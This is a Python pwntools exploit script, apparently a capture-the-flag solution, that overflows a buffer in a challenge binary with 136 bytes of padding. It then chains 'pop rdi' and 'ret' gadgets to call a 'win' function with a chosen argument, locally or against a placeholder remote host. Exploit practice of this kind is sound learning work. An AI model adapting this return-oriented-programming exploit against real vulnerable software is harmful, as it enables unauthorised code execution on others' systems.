#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
rop = ROP(exe)
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    offset = 136
    win_addr = exe.symbols['win']

    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    ret = rop.find_gadget(['ret']).address

    payload = flat(
        b'A' * offset,
        pop_rdi,
        0xfefefafa,
        ret,
        win_addr
    )
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
